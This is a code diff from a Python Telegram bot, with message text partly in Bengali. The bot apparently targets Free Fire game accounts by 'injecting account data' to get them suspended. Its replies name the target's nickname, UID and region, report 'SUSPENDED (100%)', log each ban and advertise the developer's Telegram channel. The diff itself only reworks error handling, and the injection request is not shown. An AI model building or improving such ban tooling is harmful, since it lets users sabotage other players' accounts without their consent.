+                db_insert_ban_log(account_id, nickname, region, version, "SUSPENDED (100%)", str(user.id))
+                await update.message.reply_text(
+                    f"✅ *ACCOUNT DATA INJECTED SUCCESSFULLY*\n\n"
+                    f"👤 Target Name: `{nickname}`\n"
+                    f"🆔 Target UID: `{account_id}`\n"
+                    f"🌍 Target Region: `{region}`\n"
+                    f"📦 Patch Ver: `{version}`\n"
+                    f"📊 Status: 💀 *SUSPENDED (100%)*\n\n"
+                    f"🔍 *Ban Check:* {ban_check}\n\n"
+                    f"👨‍💻 Developer: *YASIN BHAI*\n"
+                    f"📢 https://t.me/freefireob51",
+                    parse_mode="Markdown"
+                )
+            else:
+                code = resp.status_code if resp is not None else "N/A"
+                await update.message.reply_text(
+                    f"❌ *Injection Failed after retries*\n"
+                    f"Server status: `{code}`\n"
+                    f"🔍 *Ban Check:* {ban_check}",
+                    parse_mode="Markdown"
+                )
+            context.user_data["state"] = None
             await update.message.reply_text(
-                f"✅ *ACCOUNT DATA INJECTED SUCCESSFULLY*\n\n"
-                f"👤 Target Name: `{nickname}`\n"
-                f"🆔 Target UID: `{account_id}`\n"
-                f"🌍 Target Region: `{region}`\n"
-                f"📦 Patch Ver: `{version}`\n"
-                f"📊 Status: 💀 *SUSPENDED (100%)*\n\n"
-                f"🔍 *Ban Check:* {ban_check}\n\n"
-                f"👨‍💻 Developer: *YASIN BHAI*\n"
-                f"📢 https://t.me/freefireob51",
-                parse_mode="Markdown"
+                "🏠 *মেইন মেনু*",
+                parse_mode="Markdown",
+                reply_markup=main_reply_keyboard(is_admin(user.id))
             )
-        else:
-            code = resp.status_code if resp is not None else "N/A"
-            await update.message.reply_text(
-                f"❌ *Injection Failed after retries*\n"
-                f"Server status: `{code}`\n"
-                f"🔍 *Ban Check:* {ban_check}",
-                parse_mode="Markdown"
-            )
-        context.user_data["state"] = None
-        await update.message.reply_text(
-            "🏠 *মেইন মেনু*",
-            parse_mode="Markdown",
-            reply_markup=main_reply_keyboard(is_admin(user.id))
-        )
+    except Forbidden:
+        pass
+    except Exception as e:
+        print(f"Error in text_handler: {e}")
+
+
+# ================== GLOBAL ERROR HANDLER ==================
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """গ্লোবাল এরর হ্যান্ডলার — যা কোনো ব্লক/অন্যান্য এররে বট বন্ধ হতে দেবে না।"""
+    if isinstance(context.error, Forbidden):
+        print("[!] User blocked the bot. Request ignored.")
+        return
+    print(f"[!] Exception while handling an update: {context.error}")
 
 
 # ================== MAIN ==================
@@ -1082,6 +1135,8 @@ def main():
     print("[+] Starting Telegram Bot...")
 
     app = Application.builder().token(BOT_TOKEN).build()
+
+    app.add_error_handler(error_handler)
 
     app.add_handler(CommandHandler("start", start_cmd))
     app.add_handler(CommandHandler("cancel", cancel_cmd))
